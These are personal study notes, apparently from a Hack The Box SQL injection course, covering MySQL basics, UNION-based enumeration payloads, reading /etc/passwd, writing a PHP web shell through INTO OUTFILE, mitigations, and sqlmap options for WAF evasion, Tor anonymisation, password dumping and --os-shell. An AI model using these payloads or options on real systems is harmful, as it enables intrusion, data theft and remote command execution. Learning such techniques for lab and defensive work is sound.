---
layout: post
title: sqlinjection
date: 2024-02-24 10:35 +0000
---
# Notes

Root user has the privilege to execute all commands.

```shell
mysql -u root -p

mysql -u root -p<password>
```

In order to find out what our user has privilege we can execute the command `SHOW GRANTS`

To connect to a remote host:

```shell
mysql -u root -h docker.hackthebox.eu -P 3306 -p 
```

The default MySQL/MariaDB port is (3306), but it can be configured to another port. It is specified using an uppercase `P`, unlike the lowercase `p` used for passwords.

Create Database: `CREATE DATABASE database_name;`
List Databases: `SHOW DATABASES;`
List tables: `SHOW TABLES;`
Column types: [](https://dev.mysql.com/doc/refman/8.0/en/data-types.html)
List table structure: `DESCRIBE table_name;`
Properties:
- Auto increment: `id INT NOT NULL AUTO_INCREMENT,`
- column never left empty: `username VARCHAR(100) UNIQUE NOT NULL,`
- define default value: `date_of_joining DATETIME DEFAULT NOW()`

SQL statements:
- add new records: `INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);`
- retrieve records: `SELECT * FROM table_name;`
- remove table: `DROP TABLE trable_name;`
- add a new column to an existing table: `ALTER TABLE logins ADD newColumn INT;`
- rename column: `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;`
- change data type of column: `ALTER TABLE logins MODIFY oldColumn DATE;`
- drop a column: `ALTER TABLE logins DROP oldColumn;`
- update records: `UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;`

We have to specify the 'WHERE' clause with UPDATE, in order to specify which records get updated. The 'WHERE' clause will be discussed next.

Sort Query Results:
- sort results by a column, by default ascendent: `SELECT * FROM logins ORDER BY password;`
- sort by descendent: `SELECT * FROM logins ORDER BY password DESC;`
- multiple sorts: `SELECT * FROM logins ORDER BY password DESC, id ASC;`
- limit number of records: `SELECT * FROM logins LIMIT 2;`
- limit results with an offset, record 1 is offset 0: `SELECT * FROM logins LIMIT 1, 2;`
- conditional: `SELECT * FROM table_name WHERE <condition>;`
- match a certain pattern, `%` its a wildcard: `SELECT * FROM logins WHERE username LIKE 'admin%';`
- match a record with 3 characters, `_` means one character: `SELECT * FROM logins WHERE username like '___';`

Common operations and their precedence:
- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and subtraction (`-`)
- Comparison (`=, >, <, <=, >=, !=, LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

Type of SQL injections:
- In-band: Union based and Error based
- Band: Boolean based and Time based
- Out-of-band

SQLi Discovery:
Try one of the following payloads after the username to see if causes some errors or changes to the page:

| Payload | URL Encoded |
|---------|-------------|
| '       | %27         |
| "       | %22         |
| #       | %23         |
| ;       | %3B         |
| )       | %29         |


SQLi Enumeration:
- Get databases in server: `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- `
- Know the database the web app is using: `cn' UNION select 1,database(),2,3-- `
- Get tables from a database: `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- `
- Get columns from tables from a database: `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- `

Read Files:
- To read a file from the file system the user needs to have the FILE privilege
- To know what is our user we can use the following functions: `SELECT USER()`, `SELECT CURRENT_USER()` and `SELECT user from mysql.user`
- To see if our user is super admin we can use the following query `SELECT super_priv FROM mysql.user` if returns `Y` then we are.
- Dump our privileges using a UNION injection `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- `
- Or like this `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'our_user'@'localhost'"-- `
- If we have all the privileges we can use `SELECT LOAD_FILE('/etc/passwd');` to read `/etc/passwd`
- We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

Write Files(RCE):
- To write to the filesystem we need a couple of things: 
    - The user with FILE privilege
    - secure_file_priv variable not enable(empty value)
    - write access to the location
- We can see the var `secure_file_priv`: `SHOW VARIABLES LIKE 'secure_file_priv';` 
- MySQL global variables are stored in a table called global_variables, and as per the documentation, this table has two columns variable_name and variable_value.
- `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
- To write to file we will use `INTO OUTFILE ...` which is used to export the results from queries.
- Like: `SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`
- To write a web shell, we must know the base web directory for the web server (i.e. web root).
- One way to find it is to use load_file to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations.
- Writing a php web shell: `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- `

Mitigations:
- Input Sanitization: Use libraries that contain functions to escape special characters: `mysqli_real_escape_string()` and `pg_escape_string()`
- Input Validation: Use regex against the user input
- User privileges: Create users with the lowest amount of privileges for the app
- WAF: Use web application firewall to block common web attacks
- Parameterized Queries: Use placeholders and functions to add the input into the query, `mysqli_stmt_bind_param()`

SQLmap:
- To get more info about the errors we can pass the flag: `--parse-errors`
- To store the whole traffic content: `-t traffic.txt`
- Get more verbose: `-v 6`
- Without user interaction: `--batch`
- using a proxy: `--proxy`
- We can specify a suffix and prefix for the vector(payload): `--prefix="%'))" --suffix="-- -"`
- We can specify risk in order to decrease the potential damage to the server, the risk go from 1 to 3: `--risk`
- The same way, we can specify the level that translates into boundaries used, the level go from 1 to 5: `--level`
- By default the level is 1 and risk is 1, which comprises 72 payloads. If we use level 5 and risk 3 we can get 7,865 payloads.
- We can use `--code` to add a status code when a payload is successful.
- The same way with `--titles` for HTTP title, `--string=` for strings.
- If we know how many columns a certain table has we can specify when trying a UNION injection `--union-cols`
- Gather info about the db:
    - banner: `--banner`
    - current user: `--current-user`
    - hostname: `--hostname`
    - current db:: `--current-db`
    - get tables of a db:  ` --tables -D testdb`
    - dump info to a format of our choice: `--dump-format`
    - choose what columns to extract: `-C name,surname`
    - choose all columns: `--columns`
    - get a couple of rows: `--start=2 --stop=3`
    - search in the table: `--where="name LIKE 'f%'"`
    - get all info without default databases: `--dump-all --exclude-sysdbs`
    - retrieve the structure of all of the tables: `--schema`
    - search tables with the word `user`: `--search -T user`
    - to dump passwords: `--passwords`
- Bypassing Web application protections:
    - if the form uses some sort of csrf token we can add: `--csrf-token`
    - if we want to randomize some value each request we sent: `sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5`
    - if we want to calculate the parameter md5 before sending we can use python with flag eval: `sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5`
    - if we want to hide our IP we can use proxies: `proxy="socks4://177.39.187.70:33283`
    - or a list of proxies: `--proxy-file`
    - besides that we can use the tor network to anonimize our requests(the tor should be installed and running on port 9050 or 9150): `-tor`
    - to check if we are successfully connected to tor we can use: `--check-tor`
    - By default SQLmap detects WAF but we can skip by adding: `--skip-waf`
    - Some protection mechanisms block SQLmap because of the User Agent, but we can randomize with: `--random-agent`
    - To tamper our payload we have a huge list of tamper mechanims that we can use: `--tamper`, `--list-tampers`
    - Finally we can send chunked requests if we use the options: `--chunked`
- OS exploitation:
    - We can check if we have dba privileges: `--is-dba`
    - If we have privileges we can get a shell inside sqlmap: `--os-shell`
    - We can read a file directly in SQLmap: `--file-read "/etc/passwd"`
    - Or we can write a shell to `shell.php` and write it in the filesystem if we have permissions: `--file-write "shell.php" --file-dest "/var/www/html/shell.php"`
    - When trying to get a shell use the error based injection if we can because its the best way to get a shell: `--os-shell --technique=E`
    - Command of the skill assessment: `sqlmap -r request_case13.txt -p id --risk 3 --level 5 --random-agent -tamper=between,space2comment --search -T final_flag --batch -v 3`